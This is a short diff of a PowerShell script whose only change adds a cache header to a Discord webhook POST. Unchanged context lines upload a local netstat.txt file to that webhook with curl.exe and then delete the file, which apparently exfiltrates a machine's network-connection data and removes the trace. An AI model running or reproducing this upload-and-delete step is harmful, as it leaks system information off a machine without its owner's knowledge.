@@ -13,6 +13,6 @@ $data = @{
 } | ConvertTo-Json
 
 # Invia il messaggio Discord tramite Invoke-RestMethod
-Invoke-RestMethod -Uri $webhook -Method Post -Body $data -ContentType "application/json"
+Invoke-RestMethod -Uri $webhook -Method Post -Body $data -Headers @{"Cache-Control"="no-cache"} -ContentType "application/json"
 curl.exe -F "file1=@netstat.txt" $webhook
 Remove-Item '.\netstat.txt'
